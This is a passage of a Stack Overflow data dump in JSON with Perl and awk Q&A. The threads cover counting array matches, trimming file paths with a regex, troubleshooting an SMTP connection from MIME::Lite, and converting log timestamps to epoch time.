"reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1455121592, "post_id": 35319080, "comment_id": 58349948, "body": "@Borodin You will have to loop over it for every element of array1 anyway, provided you don&#39;t want to create a hash of keys that never appear in array1. As for the variable, it&#39;s a one line loop, its a disposable one character variable."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1455132857, "post_id": 35319080, "comment_id": 58357408, "body": "@123: <i>&quot;provided you don&#39;t want to create a hash of keys that never appear in array1&quot;</i> And why wouldn&#39;t you do that?"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 15, "user_id": 5908517, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7404317a24402b1f35ca10ab87884c74?s=128&d=identicon&r=PG&f=1", "display_name": "user145265", "link": "https://stackoverflow.com/users/5908517/user145265"}, "edited": false, "score": 0, "creation_date": 1455133277, "post_id": 35319080, "comment_id": 58357697, "body": "@user145265: The <i>&quot;best&quot;</i> way is the one that you can read in a week&#39;s time and understand best what it&#39;s doing. It&#39;s the solution that best implies to you what it&#39;s doing. That&#39;s the reason for language words <code>if</code>, <code>while</code>, for` etc. not being <code>op1</code>, <code>op2</code>, <code>op3</code>; the language provides a framework that allows you write self-representative code. You can easily misuse it, but I suggest that you should use identifiers and language constructs that allow your code to be read as something approaching a natural language. Even assembler has stuff like <code>MVB</code> for <i>move byte</i>"}, {"owner": {"reputation": 9406, "user_id": 4923629, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/2abZO.png?s=128&g=1", "display_name": "123", "link": "https://stackoverflow.com/users/4923629/123"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1455178145, "post_id": 35319080, "comment_id": 58375348, "body": "@Borodin <code>why wouldn&#39;t you do that</code>, why would you want to waste space on variables you are never going to use ? Regarding reading in a weeks time, i think this is pretty clear. The fact that it actually searches for values from one array in another (which is the intention) makes it far clearer what  the end goal is. If for some reason someone is unable to understand what the ONE LINE loop does, even years in the future, then i fear they may have chosen the wrong hobby/career."}], "tags": [], "owner": {"reputation": 9406, "user_id": 4923629, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/2abZO.png?s=128&g=1", "display_name": "123", "link": "https://stackoverflow.com/users/4923629/123"}, "is_accepted": true, "score": 0, "last_activity_date": 1455118021, "last_edit_date": 1455118021, "creation_date": 1455117703, "answer_id": 35319080, "question_id": 35318290, "link": "https://stackoverflow.com/questions/35318290/perl-count-occurances-of-array-elements-in-text-file/35319080#35319080", "title": "Perl - Count occurances of array elements in text file?", "body": "<p>You can also not manually count in a loop, by using grep to count for you.</p>\n\n<pre><code>use strict;\nuse warnings;\n\nmy @array1 = (\"foo\",\"bar\", \"baz\", \"hey\");\nmy @array2 = (\"foo\", \"foo\", \"bar\", \"bar\", \"bar\", \"baz\", \"baz\");\nmy %hash;\n\nfor my $i (@array1){\n$hash{$i}=grep{/^${i}$/} @array2\n}\n\nprint \"Key: $_ and Value: $hash{$_}\\n\" for (keys%hash);\n</code></pre>\n\n<p>produces</p>\n\n<pre><code>Key: bar and Value: 3\nKey: baz and Value: 2\nKey: hey and Value: 0\nKey: foo and Value: 2\n</code></pre>\n"}], "owner": {"reputation": 15, "user_id": 5908517, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7404317a24402b1f35ca10ab87884c74?s=128&d=identicon&r=PG&f=1", "display_name": "user145265", "link": "https://stackoverflow.com/users/5908517/user145265"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 136, "favorite_count": 0, "accepted_answer_id": 35319080, "answer_count": 3, "score": 1, "last_activity_date": 1455118021, "creation_date": 1455115575, "last_edit_date": 1455117170, "question_id": 35318290, "link": "https://stackoverflow.com/questions/35318290/perl-count-occurances-of-array-elements-in-text-file", "title": "Perl - Count occurances of array elements in text file?", "body": "<p>So I have an array of words (foo, bar, baz, hello) that I want to count the occurances of in another array(foo, foo, bar, bar, bar, baz, baz), then create a hash of the words as keys and the number of occurances as values, if the word cannot be found in the other array the output should be a 0, my code:</p>\n\n<pre><code>my @array1 = (\"foo\",\"bar\", \"baz\", \"hey\");\nmy @array2 = (\"foo\", \"foo\", \"bar\", \"bar\", \"bar\", \"baz\", \"baz\");\nmy %hash;\n\nforeach my $count (@array2){\n$hash{$count}++;\n}\nfor my $key (sort keys %hash) {\nprint \"$key = $hash{$key}\\n\";\n}\n</code></pre>\n\n<p>The output of this will be</p>\n\n<pre><code>foo = 2\nbar = 3\nbaz = 2\n</code></pre>\n\n<p>How would I use @array1 to count the occurances of its elements in @array2 so that it would provide the output:</p>\n\n<pre><code>foo = 2\nbar = 3\nbaz = 2\nhey = 0\n</code></pre>\n\n<p>So that I can add new elements to @array1 for future comparison operations? Because my current solution does not scale since the content of @array2 is drawn from a text file.</p>\n"}, {"tags": ["regex", "perl"], "comments": [{"owner": {"reputation": 5296, "user_id": 418066, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/38yuw.png?s=128&g=1", "display_name": "Biffen", "link": "https://stackoverflow.com/users/418066/biffen"}, "edited": false, "score": 2, "creation_date": 1455115543, "post_id": 35318182, "comment_id": 58345183, "body": "Well, <code>$relative</code> is set <i>if</i> <code>$filespec</code> matches the pattern. Not sure what other behaviour you expect from that. Also, not sure why you&#39;re so set on using regex, when there are <a href=\"http://perldoc.perl.org/File/Spec.html\" rel=\"nofollow noreferrer\">better ways</a>."}], "answers": [{"tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": true, "score": 2, "last_activity_date": 1467624825, "last_edit_date": 1467624825, "creation_date": 1455117846, "answer_id": 35319146, "question_id": 35318182, "link": "https://stackoverflow.com/questions/35318182/perl-file-path-matching/35319146#35319146", "title": "Perl- file path matching", "body": "<p>You can use the substitution operator <code>s///</code> like this. I don't know what you intend to use your modified path for, but you should note that a leading slash implies that it is an absolute path, located at the root of the file system</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse strict;\nuse warnings 'all';\nuse v5.14.1;\n\nmy $filespec = '/var/www/grammar/lecture12.mp4';\nmy $relative = $filespec =~ s|^/var/www||r;\n\nsay $relative;\n</code></pre>\n\n<h3>output</h3>\n\n<pre><code>/grammar/lecture12.mp4\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 126, "user_id": 5629187, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/16a5107ca0c722de83e57801d071fe2e?s=128&d=identicon&r=PG", "display_name": "kergma", "link": "https://stackoverflow.com/users/5629187/kergma"}, "is_accepted": false, "score": 0, "last_activity_date": 1455160786, "creation_date": 1455160786, "answer_id": 35330196, "question_id": 35318182, "link": "https://stackoverflow.com/questions/35318182/perl-file-path-matching/35330196#35330196", "title": "Perl- file path matching", "body": "<p>You get warning because $relative is only initialized if you have /var/www in $filespec, the same reason for it to be empty.</p>\n\n<p>Also you should check that $file_spec begins with /var/www, but not contains it inside.</p>\n\n<p>Also you omitted slash after www, so your regex will fail on paths like /var/www2/and/so/on.mp4</p>\n\n<p>Considering this you should change the line</p>\n\n<pre><code>my $relative = $1 if $filespec =~ m{/var/www(.*)};\n</code></pre>\n\n<p>to the following code:</p>\n\n<pre><code>$filespec =~ m{^/var/www/(.*)};\nmy $relative = $1||$filespec;\n</code></pre>\n"}], "owner": {"reputation": 214, "user_id": 4462797, "user_type": "registered", "accept_rate": 72, "profile_image": "https://www.gravatar.com/avatar/06ad54ed33711c0c99e35b3961ec9c1e?s=128&d=identicon&r=PG&f=1", "display_name": "abhillier", "link": "https://stackoverflow.com/users/4462797/abhillier"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 854, "favorite_count": 0, "accepted_answer_id": 35319146, "answer_count": 2, "score": -2, "last_activity_date": 1480353023, "creation_date": 1455115298, "last_edit_date": 1480353023, "question_id": 35318182, "link": "https://stackoverflow.com/questions/35318182/perl-file-path-matching", "title": "Perl- file path matching", "body": "<p>I am trying to cut the directory path in the Perl.\nHere is my code</p>\n\n<pre><code>#!/usr/bin/perl\nuse warnings;\nuse strict;\n\nmy $filespec = \"/var/www/grammer/lecture12.mp4\";\nmy $relative = $1 if $filespec =~ m{/var/www(.*)};\nprint $relative;\n</code></pre>\n\n<p>The output is </p>\n\n<pre><code>/grammer/lecture12.mp4\n</code></pre>\n\n<p>Now if I don't have the <code>/var/www</code> in the path i.e. only </p>\n\n<pre><code>my $filespec = \"/grammer/lecture12.mp4\";\n</code></pre>\n\n<p>The output for this is blank with a warning. But I am expecting this output path <code>/grammer/lecture12.mp4</code>. </p>\n\n<p>May be I am matching the path <code>/var/www/</code>. That's why it is not giving desired output. Or is there something else wrong? And I would like to do in <code>regex</code> only.</p>\n\n<p>Any help will be appreciated.</p>\n"}, {"tags": ["windows", "perl", "email", "smtp"], "comments": [{"owner": {"reputation": 9961, "user_id": 2139766, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/b3qcA.png?s=128&g=1", "display_name": "AnFi", "link": "https://stackoverflow.com/users/2139766/anfi"}, "edited": false, "score": 0, "creation_date": 1455222572, "post_id": 35316699, "comment_id": 58406004, "body": "Could you state exact version of  perl you use? I have found references to such problems regarding specific compiler used to compile perl <a href=\"https://social.msdn.microsoft.com/Forums/vstudio/en-US/bceb27d0-621b-41ee-b536-df8c38f71598/vs-2010-winsock-problem?forum=wsk\" rel=\"nofollow noreferrer\">social.msdn.microsoft.com/Forums/vstudio/en-US/&hellip;</a>"}], "answers": [{"comments": [{"owner": {"reputation": 1584, "user_id": 5319663, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/HRBQ5.jpg?s=128&g=1", "display_name": "Jeya Suriya Muthumari", "link": "https://stackoverflow.com/users/5319663/jeya-suriya-muthumari"}, "edited": false, "score": 0, "creation_date": 1455167926, "post_id": 35317183, "comment_id": 58370609, "body": "Hi @Mscha, I have checked as you stated using sendmail, But I am still circling around the same error."}], "tags": [], "owner": {"reputation": 6130, "user_id": 299242, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/f9bda794bc71267206358bf04ea0a179?s=128&d=identicon&r=PG", "display_name": "mscha", "link": "https://stackoverflow.com/users/299242/mscha"}, "is_accepted": false, "score": -1, "last_activity_date": 1455112683, "creation_date": 1455112683, "answer_id": 35317183, "question_id": 35316699, "link": "https://stackoverflow.com/questions/35316699/perl-smtp-failed-to-connect-to-mail-server/35317183#35317183", "title": "Perl: SMTP failed to connect to mail server", "body": "<p>If you're running this on a well-configured Linux server, you might have better luck if you take out</p>\n\n<pre><code>use Net::SMTP\n</code></pre>\n\n<p>and</p>\n\n<pre><code>MIME::Lite-&gt;send('smtp', $host, Timeout=&gt;60);\n</code></pre>\n\n<p>and just let <code>MIME::Lite</code> use its defaults \u2013 usually it lets <code>sendmail</code> handle the message.</p>\n"}, {"comments": [{"owner": {"reputation": 1584, "user_id": 5319663, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/HRBQ5.jpg?s=128&g=1", "display_name": "Jeya Suriya Muthumari", "link": "https://stackoverflow.com/users/5319663/jeya-suriya-muthumari"}, "edited": false, "score": 0, "creation_date": 1455166833, "post_id": 35317865, "comment_id": 58370262, "body": "Hi @Andrzej, Thanks for Reply, I am using Net Smtp of version 3.05 and MIME lite of version 3.01. I have tested with the port 465 as you stated. I am resulting in the same error again. I can able to ping the host too. Then why it is telling failed to connect to mail server. Do I need to check anything else."}, {"owner": {"reputation": 9961, "user_id": 2139766, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/b3qcA.png?s=128&g=1", "display_name": "AnFi", "link": "https://stackoverflow.com/users/2139766/anfi"}, "reply_to_user": {"reputation": 1584, "user_id": 5319663, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/HRBQ5.jpg?s=128&g=1", "display_name": "Jeya Suriya Muthumari", "link": "https://stackoverflow.com/users/5319663/jeya-suriya-muthumari"}, "edited": false, "score": 1, "creation_date": 1455167911, "post_id": 35317865, "comment_id": 58370602, "body": "[Q2] Do you get SMTP greeting message when you telnet port 587 at smtp.gmail.com? (Is it perl&#39;s fault?)"}, {"owner": {"reputation": 1584, "user_id": 5319663, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/HRBQ5.jpg?s=128&g=1", "display_name": "Jeya Suriya Muthumari", "link": "https://stackoverflow.com/users/5319663/jeya-suriya-muthumari"}, "edited": false, "score": 0, "creation_date": 1455168631, "post_id": 35317865, "comment_id": 58370852, "body": "I checked with the command - <code>open smtp.gmail.com 587</code>, i got reply as - <code>220 smtp.gmail.com ESMTP 188sm1896254qhi.1 - gsmtp</code> .. I also tried with the host - <code>open secure.emailsrvr.com 587</code>   , where i got reply as <code>220 smtp15.relay.iad3a.emailsrvr.com ESMTP - VA Code Section 18.2-152.3:1 forbid s use of this system for unsolicited bulk electronic mail (Spam) 421 4.4.2 Timeout exceeded   Connection to host lost.  Press any key to continue...</code>"}, {"owner": {"reputation": 1584, "user_id": 5319663, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/HRBQ5.jpg?s=128&g=1", "display_name": "Jeya Suriya Muthumari", "link": "https://stackoverflow.com/users/5319663/jeya-suriya-muthumari"}, "edited": false, "score": 0, "creation_date": 1455168863, "post_id": 35317865, "comment_id": 58370930, "body": "How can I find the port number for the host name ?"}, {"owner": {"reputation": 9961, "user_id": 2139766, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/b3qcA.png?s=128&g=1", "display_name": "AnFi", "link": "https://stackoverflow.com/users/2139766/anfi"}, "reply_to_user": {"reputation": 1584, "user_id": 5319663, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/HRBQ5.jpg?s=128&g=1", "display_name": "Jeya Suriya Muthumari", "link": "https://stackoverflow.com/users/5319663/jeya-suriya-muthumari"}, "edited": false, "score": 0, "creation_date": 1455223488, "post_id": 35317865, "comment_id": 58406597, "body": "You can use <code>telnet</code> to test if ports <b>25</b> and **58788 are accessible - you should get SMTP greeting message.  With port 465 telnet will establish connection but AFAIK (standard) telnet will not negotiate SSL so it will not get SMTP greeting message - but you can use (standard) telnet for testing port 465 anyway."}, {"owner": {"reputation": 1584, "user_id": 5319663, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/HRBQ5.jpg?s=128&g=1", "display_name": "Jeya Suriya Muthumari", "link": "https://stackoverflow.com/users/5319663/jeya-suriya-muthumari"}, "edited": false, "score": 0, "creation_date": 1455253383, "post_id": 35317865, "comment_id": 58417008, "body": "I have checked that too. Finally I found that IO socket modules are corrupted. I have un installed it completely. Then installed as fresh now it is WORKING."}, {"owner": {"reputation": 1584, "user_id": 5319663, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/HRBQ5.jpg?s=128&g=1", "display_name": "Jeya Suriya Muthumari", "link": "https://stackoverflow.com/users/5319663/jeya-suriya-muthumari"}, "edited": false, "score": 0, "creation_date": 1455253411, "post_id": 35317865, "comment_id": 58417016, "body": "Thanks a lot @Andrzej,"}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 0, "creation_date": 1560869094, "post_id": 35317865, "comment_id": 99873301, "body": "Now you&#39;ve fixed the underlying connection problems, can I suggest that you stop using MIME::Lite and Net::SMTP and replace them with something simpler like <a href=\"https://metacpan.org/pod/Email::Sender\" rel=\"nofollow noreferrer\">Email::Sender</a> or <a href=\"https://metacpan.org/pod/Email::Stuffer\" rel=\"nofollow noreferrer\">Email::Stuffer</a>?"}], "tags": [], "owner": {"reputation": 9961, "user_id": 2139766, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/b3qcA.png?s=128&g=1", "display_name": "AnFi", "link": "https://stackoverflow.com/users/2139766/anfi"}, "is_accepted": false, "score": 2, "last_activity_date": 1560866909, "last_edit_date": 1560866909, "creation_date": 1455114458, "answer_id": 35317865, "question_id": 35316699, "link": "https://stackoverflow.com/questions/35316699/perl-smtp-failed-to-connect-to-mail-server/35317865#35317865", "title": "Perl: SMTP failed to connect to mail server", "body": "<h1>MIME::Lite / Net::SMTP v3.* - sending via smtp.gmail.com</h1>\n\n<p><strong>Q1</strong>: Can you telnet smtp (25) port at <code>smtp.gmail.com</code>?  Do you get SMTP greeting message?</p>\n\n<pre><code>telnet smtp.gmail.com 25\n</code></pre>\n\n<p><strong>A1</strong>: NO => It is quite likely that your outgoing connections to smtp port are blocked to avoid <em>outgoing</em> spam.</p>\n\n<p><strong>Q2</strong>: Can you telnet msa (587) port at <code>smtp.gmail.com</code>?  Do you get SMTP greeting message?</p>\n\n<pre><code>telnet smtp.gmail.com 587\n</code></pre>\n\n<p><strong>A1</strong>: YES => send via msa (587) or smtps (465).  <code>MIME::Lite</code> can connect to smtps (465) port using <code>Net::SMTP</code> version 3.*.<br>\n[ <strong>WARNING:</strong> see <a href=\"https://stackoverflow.com/questions/45588971/mimelite-3-030-netsmtp-with-smtps-port-465\">MIME::Lite 3.030 - NET::SMTP with smtps (port 465)</a> ]</p>\n\n<pre><code># use smtps (465) port - it requires Net::SMTP version 3.*\n# use debugging (Debug=&gt;1) for initial tests\nMIME::Lite-&gt;send('smtp', $host, SSL =&gt; 1, Timeout =&gt; 60,\n  AuthUser =&gt; $user, AuthPass =&gt; $pass, \n  Debug =&gt; 1);\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 1584, "user_id": 5319663, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/HRBQ5.jpg?s=128&g=1", "display_name": "Jeya Suriya Muthumari", "link": "https://stackoverflow.com/users/5319663/jeya-suriya-muthumari"}, "is_accepted": true, "score": 1, "last_activity_date": 1456809298, "creation_date": 1456809298, "answer_id": 35715157, "question_id": 35316699, "link": "https://stackoverflow.com/questions/35316699/perl-smtp-failed-to-connect-to-mail-server/35715157#35715157", "title": "Perl: SMTP failed to connect to mail server", "body": "<p>Sorry for answering my Own question, but this may help to someone.</p>\n\n<p>After a month of search finally I found why my socket is failing to connect to SMTP with proper host and pass code. In my thing the IO::Socket module get collapsed. I have <strong>replaced IO::Socket</strong> with the fresh one and the whole thing worked. I guess, the reason for the module collapse is may be the way I manually download the required modules from different site and place it in the Perl lib and not from Perl Package Manager. </p>\n\n<p>Thanks  </p>\n"}], "owner": {"reputation": 1584, "user_id": 5319663, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/HRBQ5.jpg?s=128&g=1", "display_name": "Jeya Suriya Muthumari", "link": "https://stackoverflow.com/users/5319663/jeya-suriya-muthumari"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2376, "favorite_count": 3, "accepted_answer_id": 35715157, "answer_count": 3, "score": 2, "last_activity_date": 1560866909, "creation_date": 1455111196, "question_id": 35316699, "link": "https://stackoverflow.com/questions/35316699/perl-smtp-failed-to-connect-to-mail-server", "title": "Perl: SMTP failed to connect to mail server", "body": "<p>I have coded a simple Perl script to send mail using MIME::Lite and Net::SMTP modules. But it resulted in the error, <strong>\"SMTP Failed to connect to mail server: A non-blocking socket operation could not be completed immediately\"</strong>.</p>\n\n<p><strong>Perl script I have tried,</strong> </p>\n\n<pre><code>use strict;\nuse warnings;\nuse MIME::Lite;\nuse Net::SMTP;\n\nmy $from = 'agnesgrusteven@gmail.com';\nmy $to = 'agnesgrusteven@gmail.com';\nmy $host = 'smtp.gmail.com';\n\nmy $subject = 'A test  message by script ';\nmy $body = \"Please ignore this message as this is test from Perl scripts \";\n\nmy $msg = MIME::Lite-&gt;new (\n  From =&gt; $from,\n  To =&gt; $to,\n  Subject =&gt; $subject,\n  Type =&gt;'multipart/mixed'\n) or die \"Error creating multipart container: $!\\n\";\n\n$msg-&gt;attach (\n  Type =&gt; 'TEXT',\n  Data =&gt; $body\n) or die \"Error adding the text message part: $!\\n\";\n\nMIME::Lite-&gt;send('smtp', $host, Timeout=&gt;60);\n$msg-&gt;send;\n</code></pre>\n\n<p><strong>Actual error I got,</strong></p>\n\n<pre><code>G:\\&gt;perl SampleEmail.pl\nSMTP Failed to connect to mail server: A non-blocking socket operation could not\n be completed immediately.\n at SampleEmail.pl line 26.\n</code></pre>\n\n<p>Please help me what specifically I need to check to send mail properly.</p>\n\n<p>Thanks in Advance</p>\n"}, {"tags": ["bash", "perl", "awk", "timestamp", "epoch"], "comments": [{"owner": {"reputation": 61, "user_id": 4669326, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/01bc3c5413f8faf7ab5d3409d0e3875d?s=128&d=identicon&r=PG&f=1", "display_name": "SScast", "link": "https://stackoverflow.com/users/4669326/sscast"}, "reply_to_user": {"reputation": 9406, "user_id": 4923629, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/2abZO.png?s=128&g=1", "display_name": "123", "link": "https://stackoverflow.com/users/4923629/123"}, "edited": false, "score": 0, "creation_date": 1455112297, "post_id": 35315937, "comment_id": 58342806, "body": "The first and the third column i lose if i print the date thru date -d&quot;$date&quot; +%s"}, {"owner": {"reputation": 9406, "user_id": 4923629, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/2abZO.png?s=128&g=1", "display_name": "123", "link": "https://stackoverflow.com/users/4923629/123"}, "edited": false, "score": 0, "creation_date": 1455112325, "post_id": 35315937, "comment_id": 58342824, "body": "If you have GNU awk you can use <a href=\"https://www.gnu.org/software/gawk/manual/html_node/Time-Functions.html\" rel=\"nofollow noreferrer\">strftime</a>"}, {"owner": {"reputation": 9406, "user_id": 4923629, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/2abZO.png?s=128&g=1", "display_name": "123", "link": "https://stackoverflow.com/users/4923629/123"}, "edited": false, "score": 0, "creation_date": 1455112472, "post_id": 35315937, "comment_id": 58342927, "body": "Also show your original data as your awk command looks a little complicated for the data you are getting out."}, {"owner": {"reputation": 155597, "user_id": 1745001, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/99a3ebae89496eb16afe453aae97f5be?s=128&d=identicon&r=PG", "display_name": "Ed Morton", "link": "https://stackoverflow.com/users/1745001/ed-morton"}, "reply_to_user": {"reputation": 9406, "user_id": 4923629, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/2abZO.png?s=128&g=1", "display_name": "123", "link": "https://stackoverflow.com/users/4923629/123"}, "edited": false, "score": 0, "creation_date": 1455114906, "post_id": 35315937, "comment_id": 58344742, "body": "Do you have GNU awk? @123 - you mean <code>mktime()</code>, not <code>strftime()</code>. If only we had <code>strptime()</code> but we don&#39;t. Anyway, for the OP: Post the sample input that produces the output you posted. The first arg to <code>gsub()</code> is a regexp, btw, not a string so if you pass it a regexp then awk doesn&#39;t have to convert a string to a regexp and so you don&#39;t need to double escape metachars, e.g. you should be doing <code>gsub(&#47;\\[&#47;, &quot;&quot;)</code>, not <code>gsub(&quot;\\\\[&quot;, &quot;&quot;)</code>. Right now by using a string where a regexp is expected you&#39;re doubling the work for yourself and for awk."}, {"owner": {"reputation": 61, "user_id": 4669326, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/01bc3c5413f8faf7ab5d3409d0e3875d?s=128&d=identicon&r=PG&f=1", "display_name": "SScast", "link": "https://stackoverflow.com/users/4669326/sscast"}, "edited": false, "score": 0, "creation_date": 1455115137, "post_id": 35315937, "comment_id": 58344894, "body": "This is my RAW log file: [] ||  ||  ||  || [] || http || 40080 || 176.237.167.102 || [] || [-] || [0.072] || 176.237.167.102 || - || - || [25/Jan/2016:06:30:26 +0000] || &quot;POST /checknewmsg HTTP/1.1&quot; || 200 || 265 || 895 || &quot;<a href=\"http://google.com/post\" rel=\"nofollow noreferrer\">google.com/post</a>\u201d || &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36&quot; || &quot;-&quot; || [TR]"}, {"owner": {"reputation": 155597, "user_id": 1745001, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/99a3ebae89496eb16afe453aae97f5be?s=128&d=identicon&r=PG", "display_name": "Ed Morton", "link": "https://stackoverflow.com/users/1745001/ed-morton"}, "edited": false, "score": 0, "creation_date": 1455115509, "post_id": 35315937, "comment_id": 58345166, "body": "No, edit your question. Don&#39;t try to put code, input, output, or other formatted text in a comment as you can&#39;t. And answer the question - do you have (or can you get) GNU awk?"}, {"owner": {"reputation": 155597, "user_id": 1745001, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/99a3ebae89496eb16afe453aae97f5be?s=128&d=identicon&r=PG", "display_name": "Ed Morton", "link": "https://stackoverflow.com/users/1745001/ed-morton"}, "edited": false, "score": 3, "creation_date": 1455115967, "post_id": 35315937, "comment_id": 58345495, "body": "OK, so now you&#39;ve edited your question but you&#39;ve only provided 1 line of input and that doesn&#39;t correspond to any of the lines of expected output. Look, it&#39;s extremely simple - post a few lines of sample input and the output you want to get from <b>that input</b>. Don&#39;t show us one set of input and then the output you want to get from some completely different set of input - that&#39;s not useful."}], "answers": [{"comments": [{"owner": {"reputation": 61, "user_id": 4669326, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/01bc3c5413f8faf7ab5d3409d0e3875d?s=128&d=identicon&r=PG&f=1", "display_name": "SScast", "link": "https://stackoverflow.com/users/4669326/sscast"}, "edited": false, "score": 0, "creation_date": 1455118614, "post_id": 35318726, "comment_id": 58347589, "body": "Yes, this is but i need to count the number of lines for the uniq timestamp and not the IP addresses even if they are printed. I`m using GNU awk. Thank you very much!"}, {"owner": {"reputation": 155597, "user_id": 1745001, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/99a3ebae89496eb16afe453aae97f5be?s=128&d=identicon&r=PG", "display_name": "Ed Morton", "link": "https://stackoverflow.com/users/1745001/ed-morton"}, "reply_to_user": {"reputation": 61, "user_id": 4669326, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/01bc3c5413f8faf7ab5d3409d0e3875d?s=128&d=identicon&r=PG&f=1", "display_name": "SScast", "link": "https://stackoverflow.com/users/4669326/sscast"}, "edited": false, "score": 0, "creation_date": 1455123137, "post_id": 35318726, "comment_id": 58351139, "body": "So, again (and for the last time), edit your question to provide sample input and the expected output given that input. In particular include a case where you have multiple IP addresses for 1 timestamp since you haven&#39;t described your requirements for output in that case at all and there&#39;s various ways you might want to handle it."}], "tags": [], "owner": {"reputation": 155597, "user_id": 1745001, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/99a3ebae89496eb16afe453aae97f5be?s=128&d=identicon&r=PG", "display_name": "Ed Morton", "link": "https://stackoverflow.com/users/1745001/ed-morton"}, "is_accepted": true, "score": 0, "last_activity_date": 1455116799, "creation_date": 1455116799, "answer_id": 35318726, "question_id": 35315937, "link": "https://stackoverflow.com/questions/35315937/awk-date-to-epoch-in-log-file-and-print-other-columns-also/35318726#35318726", "title": "awk date to epoch in log file and print other columns also", "body": "<p>Since you've been a tad reluctant to provide the requested info in your question, idk if this is what you're looking for or not but with GNU awk for <code>mktime()</code>:</p>\n\n<pre><code>$ cat tst.awk\nBEGIN { FS=\"\\\\s*[|][|]\\\\s*\" }\n{\n    split($15,a,/[][\\/: ]/)\n    a[3] = (match(\"JanFebMarAprMayJunJulAugSepOctNovDec\",a[3])+2)/3\n    secs = mktime(a[4]\" \"a[3]\" \"a[2]\" \"a[5]\" \"a[6]\" \"a[7])\n    cnt[secs OFS $12]++\n}\nEND {\n    for (key in cnt) {\n        print cnt[key], key\n    }\n}\n\n$ cat file\n[] ||  ||  ||  || [] || http || 40080 || 176.237.167.102 || [] || [-] || [0.072] || 176.237.167.102 || - || - || [25/Jan/2016:06:30:26 +0000] || \"POST /checknewmsg HTTP/1.1\" || 200 || 265 || 895 || \"http://google.com/post\u201d || \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36\" || \"-\" || [TR]\n\n$ 